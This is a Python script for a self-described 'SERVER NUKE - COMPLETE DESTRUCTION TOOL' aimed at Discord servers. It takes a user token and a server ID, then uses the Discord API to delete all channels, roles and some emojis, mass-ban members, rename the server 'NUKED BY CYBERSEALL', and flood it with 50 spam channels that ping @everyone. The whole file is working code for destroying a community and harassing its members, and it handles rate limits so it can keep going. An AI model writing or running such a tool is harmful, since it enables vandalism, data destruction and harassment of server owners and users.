

import requests
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import inquirer

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

RESET = '\033[0m'

def pretty_print(text, color=(255,64,64)):
    ansi = rgb(*color)
    print(ansi + text + RESET)

def get_headers(token):
    return {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }

def handle_rate_limit(response):
    if response.status_code == 429:
        try:
            retry_after = response.json().get('retry_after', 5)
            pretty_print(f"Global rate limit hit, waiting {retry_after}s...", (255,255,0))
            time.sleep(retry_after + 1)
            return True
        except:
            time.sleep(5)
            return True
    return False

def delete_all_channels(token, guild_id):
    pretty_print("Starting channel deletion...", (255,128,0))
    headers = get_headers(token)
    
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
    if response.status_code == 404:
        pretty_print("Server not found or no access to channels!", (255,0,0))
        return 0
    elif response.status_code == 403:
        pretty_print("No permission to view channels!", (255,0,0))
        return 0
    elif response.status_code != 200:
        pretty_print(f"Failed to get channels: {response.status_code}", (255,0,0))
        return 0
    
    channels = response.json()
    deleted_count = 0
    
    def delete_channel(channel):
        try:
            response = requests.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers=headers)
            if response.status_code in [204, 200]:
                pretty_print(f"Deleted channel: {channel['name']}", (0,255,0))
                return 1
            elif response.status_code == 429: 
                retry_after = response.json().get('retry_after', 5)
                pretty_print(f"Rate limited, waiting {retry_after}s for {channel['name']}", (255,255,0))
                time.sleep(retry_after + 1)
                response = requests.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers=headers)
                if response.status_code in [204, 200]:
                    pretty_print(f"Deleted channel (retry): {channel['name']}", (0,255,0))
                    return 1
            pretty_print(f"Failed to delete channel {channel['name']}: {response.status_code}", (255,0,0))
            return 0
        except Exception as e:
            pretty_print(f"Error deleting channel {channel['name']}: {str(e)}", (255,0,0))
            return 0
    
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(delete_channel, channel) for channel in channels]
        for future in as_completed(futures):
            deleted_count += future.result()
            time.sleep(1.5) 
    
    pretty_print(f"Deleted {deleted_count}/{len(channels)} channels", (255,255,0))
    return deleted_count

def delete_all_roles(token, guild_id):
    pretty_print("Starting role deletion...", (255,128,0))
    headers = get_headers(token)
    
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
    if response.status_code == 404:
        pretty_print("Server not found or no access to roles!", (255,0,0))
        return 0
    elif response.status_code == 403:
        pretty_print("No permission to view roles!", (255,0,0))
        return 0
    elif response.status_code != 200:
        pretty_print(f"Failed to get roles: {response.status_code}", (255,0,0))
        return 0
    
    roles = response.json()
    deleted_count = 0
    
    def delete_role(role):
        if role['name'] == '@everyone':
            return 0
        try:
            response = requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}', headers=headers)
            if response.status_code in [204, 200]:
                pretty_print(f"Deleted role: {role['name']}", (0,255,0))
                return 1
            elif response.status_code == 429:
                retry_after = response.json().get('retry_after', 5)
                pretty_print(f"Rate limited, waiting {retry_after}s for role {role['name']}", (255,255,0))
                time.sleep(retry_after + 1)
                # Retry
                response = requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}', headers=headers)
                if response.status_code in [204, 200]:
                    pretty_print(f"Deleted role (retry): {role['name']}", (0,255,0))
                    return 1
            pretty_print(f"Failed to delete role {role['name']}: {response.status_code}", (255,0,0))
            return 0
        except Exception as e:
            pretty_print(f"Error deleting role {role['name']}: {str(e)}", (255,0,0))
            return 0
    
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = [executor.submit(delete_role, role) for role in roles]
        for future in as_completed(futures):
            deleted_count += future.result()
            time.sleep(2)
    
    pretty_print(f"Deleted {deleted_count}/{len(roles)-1} roles", (255,255,0))
    return deleted_count

def ban_all_members(token, guild_id):
    pretty_print("Starting member banning...", (255,128,0))
    headers = get_headers(token)
    
    members = []
    after = None
    
    while True:
        url = f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000'
        if after:
            url += f'&after={after}'
        
        response = requests.get(url, headers=headers)
        if response.status_code != 200:
            break
        
        batch = response.json()
        if not batch:
            break
        
        members.extend(batch)
        after = batch[-1]['user']['id']
        
        if len(batch) < 1000:
            break
    
    banned_count = 0
    
    def ban_member(member):
        user_id = member['user']['id']
        username = member['user']['username']
        
        try:
            ban_data = {
                'delete_message_days': 7,
                'reason': 'Server Nuke - Mass Ban'
            }
            response = requests.put(
                f'https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}',
                headers=headers,
                json=ban_data
            )
            if response.status_code in [204, 200]:
                pretty_print(f"Banned: {username}", (0,255,0))
                return 1
            elif response.status_code == 429:
                retry_after = response.json().get('retry_after', 10)
                pretty_print(f"Rate limited, waiting {retry_after}s for {username}", (255,255,0))
                time.sleep(retry_after + 2)
                return 0
            else:
                pretty_print(f"Failed to ban {username}: {response.status_code}", (255,0,0))
                return 0
        except Exception as e:
            pretty_print(f"Error banning {username}: {str(e)}", (255,0,0))
            return 0
    
    with ThreadPoolExecutor(max_workers=1) as executor: 
        futures = [executor.submit(ban_member, member) for member in members[:50]]
        for future in as_completed(futures):
            banned_count += future.result()
            time.sleep(3)
    
    pretty_print(f"Banned {banned_count}/{min(len(members), 50)} members", (255,255,0))
    return banned_count

def create_spam_channels(token, guild_id, count=50):
    pretty_print(f"Creating {count} spam channels...", (255,128,0))
    headers = get_headers(token)
    created_count = 0
    
    def create_channel(index):
        try:
            channel_data = {
                'name': f'nuked-{index}',
                'type': 0,  # Text channel
                'topic': '💀 NUKED BY CYBERSEALL 💀'
            }
            response = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json=channel_data)
            if response.status_code in [200, 201]:
                channel = response.json()
                pretty_print(f"Created channel: {channel['name']}", (0,255,0))
                
                message_data = {
                    'content': '@everyone NUKED BY CYBERSEALL @everyone'
                }
                requests.post(f'https://discord.com/api/v9/channels/{channel["id"]}/messages', headers=headers, json=message_data)
                return 1
            elif response.status_code == 429:
                retry_after = response.json().get('retry_after', 5)
                pretty_print(f"Rate limited, waiting {retry_after}s", (255,255,0))
                time.sleep(retry_after + 1)
                return 0
            else:
                pretty_print(f"Failed to create channel {index}: {response.status_code}", (255,0,0))
                return 0
        except Exception as e:
            pretty_print(f"Error creating channel {index}: {str(e)}", (255,0,0))
            return 0
    
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = [executor.submit(create_channel, i) for i in range(1, count + 1)]
        for future in as_completed(futures):
            created_count += future.result()
            time.sleep(2) 
    
    pretty_print(f"Created {created_count}/{count} spam channels", (255,255,0))
    return created_count

def delete_some_emojis(token, guild_id, max_delete=10):
    pretty_print(f"Deleting up to {max_delete} emojis...", (255,128,0))
    headers = get_headers(token)
    
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/emojis', headers=headers)
    if response.status_code != 200:
        pretty_print(f"Failed to get emojis: {response.status_code}", (255,0,0))
        return 0
    
    emojis = response.json()
    deleted_count = 0
    
    for emoji in emojis[:max_delete]:
        try:
            response = requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/emojis/{emoji["id"]}', headers=headers)
            if response.status_code in [204, 200]:
                pretty_print(f"Deleted emoji: {emoji['name']}", (0,255,0))
                deleted_count += 1
            elif response.status_code == 429:
                retry_after = response.json().get('retry_after', 5)
                pretty_print(f"Rate limited, waiting {retry_after}s", (255,255,0))
                time.sleep(retry_after + 1)
            else:
                pretty_print(f"Failed to delete emoji {emoji['name']}: {response.status_code}", (255,0,0))
        except Exception as e:
            pretty_print(f"Error deleting emoji {emoji['name']}: {str(e)}", (255,0,0))
        
        time.sleep(2) 
    
    pretty_print(f"Deleted {deleted_count}/{min(len(emojis), max_delete)} emojis", (255,255,0))
    return deleted_count

def modify_server_settings(token, guild_id):
    pretty_print("Modifying server settings...", (255,128,0))
    headers = get_headers(token)
    
    chaos_settings = {
        'name': 'NUKED BY CYBERSEALL',
        'description': 'This server has been completely destroyed',
        'verification_level': 4,
        'default_message_notifications': 0,
        'explicit_content_filter': 0,
        'afk_timeout': 60,
        'system_channel_flags': 7
    }
    
    try:
        response = requests.patch(
            f'https://discord.com/api/v9/guilds/{guild_id}',
            headers=headers,
            json=chaos_settings
        )
        if response.status_code == 200:
            pretty_print("Server settings modified", (0,255,0))
            return True
        else:
            pretty_print(f"Failed to modify settings: {response.status_code}", (255,0,0))
            return False
    except Exception as e:
        pretty_print(f"Error modifying settings: {str(e)}", (255,0,0))
        return False

def validate_token_and_server(token, guild_id):
    """Validiert Token und Server-Zugriff"""
    headers = get_headers(token)
    
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if response.status_code != 200:
        pretty_print("Invalid Discord token!", (255,0,0))
        return False
    
    user_data = response.json()
    pretty_print(f"Token valid - Logged in as: {user_data['username']}", (0,255,0))
    
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    if response.status_code == 404:
        pretty_print("Server not found or no access!", (255,0,0))
        return False
    elif response.status_code == 403:
        pretty_print("No permission to access this server!", (255,0,0))
        return False
    elif response.status_code != 200:
        pretty_print(f"Server access error: {response.status_code}", (255,0,0))
        return False
    
    server_data = response.json()
    pretty_print(f"Server access confirmed: {server_data['name']}", (0,255,0))
    
    # Check permissions
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/members/@me', headers=headers)
    if response.status_code == 200:
        member_data = response.json()
        if any(role.get('permissions', 0) & 0x8 for role in member_data.get('roles', [])):
            pretty_print("Administrator permissions confirmed", (0,255,0))
            return True
        else:
            pretty_print("WARNING: No administrator permissions detected!", (255,255,0))
            return True
    
    return True

def run_server_nuke():
    pretty_print("SERVER NUKE - COMPLETE DESTRUCTION TOOL", (255,0,0))
    pretty_print("WARNING: This will COMPLETELY DESTROY the server!", (255,255,0))
    
    token = input("\nEnter Discord token: ").strip()
    if not token:
        pretty_print("No token provided!", (255,0,0))
        return
    
    guild_id = input("Enter Server ID: ").strip()
    if not guild_id:
        pretty_print("No server ID provided!", (255,0,0))
        return
    
    pretty_print("\nValidating token and server access...", (255,255,0))
    if not validate_token_and_server(token, guild_id):
        pretty_print("Validation failed - Cannot proceed!", (255,0,0))
        input("\nPress Enter to return to menu...")
        return
    
    pretty_print("\nINITIATING SERVER NUKE SEQUENCE...", (255,0,0))
    time.sleep(1)
    
    pretty_print("Phase 1: Channel Destruction", (255,128,0))
    deleted_channels = delete_all_channels(token, guild_id)
    time.sleep(1)
    
    pretty_print("Phase 2: Role Annihilation", (255,128,0))
    deleted_roles = delete_all_roles(token, guild_id)
    time.sleep(1)
    
    pretty_print("Phase 3: Member Elimination", (255,128,0))
    banned_members = ban_all_members(token, guild_id)
    time.sleep(1)
    
    pretty_print("Phase 4: Limited Emoji Destruction", (255,128,0))
    deleted_emojis = delete_some_emojis(token, guild_id, 10)
    time.sleep(1)
    
    pretty_print("Phase 5: Server Settings Chaos", (255,128,0))
    settings_modified = modify_server_settings(token, guild_id)
    time.sleep(1)
    
    pretty_print("Phase 6: Spam Channel Creation", (255,128,0))
    created_channels = create_spam_channels(token, guild_id, 50)
    
    pretty_print("\nSERVER NUKE COMPLETED!", (255,0,0))
    pretty_print(f"Destruction Summary:", (255,255,0))
    pretty_print(f"   Channels deleted: {deleted_channels}", (255,255,255))
    pretty_print(f"   Roles deleted: {deleted_roles}", (255,255,255))
    pretty_print(f"   Members banned: {banned_members}", (255,255,255))
    pretty_print(f"   Emojis deleted: {deleted_emojis}", (255,255,255))
    pretty_print(f"   Settings modified: {'Yes' if settings_modified else 'No'}", (255,255,255))
    pretty_print(f"   Spam channels created: {created_channels}", (255,255,255))
    
    pretty_print("\nThe server has been completely obliterated!", (255,0,0))
    
    if deleted_channels == 0 and deleted_roles == 0 and banned_members == 0:
        pretty_print("\nTROUBLESHOOTING:", (255,255,0))
        pretty_print("- Check if your Discord token is valid", (255,255,255))
        pretty_print("- Verify the Server ID is correct", (255,255,255))
        pretty_print("- Ensure you have Administrator permissions", (255,255,255))
        pretty_print("- Make sure the bot is in the server", (255,255,255))
    
    input("\nPress Enter to return to menu...")

if __name__ == "__main__":
    run_server_nuke() 
# update
